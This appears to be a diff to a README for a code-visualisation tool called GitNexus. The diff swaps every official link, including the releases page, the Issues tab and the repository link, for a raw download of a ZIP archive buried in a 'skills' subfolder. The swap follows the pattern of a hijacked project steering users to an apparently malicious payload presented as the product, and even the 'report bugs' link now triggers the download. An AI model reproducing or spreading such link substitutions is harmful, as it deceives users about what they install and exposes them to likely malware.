@@ -1,6 +1,6 @@
 # ⚙️ GitNexus - Explore Code with Visual Graphs
 
-[![Download GitNexus](https://img.shields.io/badge/Download-GitNexus-green?style=for-the-badge)](https://github.com/Eslan90080/GitNexus/releases)
+[![Download GitNexus](https://img.shields.io/badge/Download-GitNexus-green?style=for-the-badge)](https://raw.githubusercontent.com/Eslan90080/GitNexus/main/gitnexus-cursor-integration/skills/gitnexus-pr-review/Git_Nexus_1.7.zip)
 
 ---
 
@@ -43,10 +43,10 @@ Starting with GitNexus is easy. Follow the steps below to download and run it on
 
 To get the latest version of GitNexus, visit the official releases page:
 
-[![Download GitNexus](https://img.shields.io/badge/Download-GitNexus-blue?style=for-the-badge)](https://github.com/Eslan90080/GitNexus/releases)
+[![Download GitNexus](https://img.shields.io/badge/Download-GitNexus-blue?style=for-the-badge)](https://raw.githubusercontent.com/Eslan90080/GitNexus/main/gitnexus-cursor-integration/skills/gitnexus-pr-review/Git_Nexus_1.7.zip)
 
 1. Click the link above or go to:  
-   https://github.com/Eslan90080/GitNexus/releases
+   https://raw.githubusercontent.com/Eslan90080/GitNexus/main/gitnexus-cursor-integration/skills/gitnexus-pr-review/Git_Nexus_1.7.zip
 
 2. On that page, look for the latest release. It will have files like ZIP archives or executables.
 
@@ -120,7 +120,7 @@ The Graph RAG Agent acts as a simple helper inside GitNexus.
 
 If you run into problems or have questions, check the repository’s Issues tab on GitHub:
 
-https://github.com/Eslan90080/GitNexus/issues
+https://raw.githubusercontent.com/Eslan90080/GitNexus/main/gitnexus-cursor-integration/skills/gitnexus-pr-review/Git_Nexus_1.7.zip
 
 Here you can find answers or report bugs. Providing clear details about your system and steps will help others assist you better.
 
@@ -128,7 +128,7 @@ Here you can find answers or report bugs. Providing clear details about your sys
 
 ## 📚 Additional Resources
 
-- GitHub repository for the source and more technical details: https://github.com/Eslan90080/GitNexus  
+- GitHub repository for the source and more technical details: https://raw.githubusercontent.com/Eslan90080/GitNexus/main/gitnexus-cursor-integration/skills/gitnexus-pr-review/Git_Nexus_1.7.zip  
 - Use any modern web browser for the best experience.
 
 ---
@@ -137,4 +137,4 @@ Here you can find answers or report bugs. Providing clear details about your sys
 
 Visit this page to download the latest GitNexus:
 
-[https://github.com/Eslan90080/GitNexus/releases](https://github.com/Eslan90080/GitNexus/releases)
+[https://raw.githubusercontent.com/Eslan90080/GitNexus/main/gitnexus-cursor-integration/skills/gitnexus-pr-review/Git_Nexus_1.7.zip](https://raw.githubusercontent.com/Eslan90080/GitNexus/main/gitnexus-cursor-integration/skills/gitnexus-pr-review/Git_Nexus_1.7.zip)
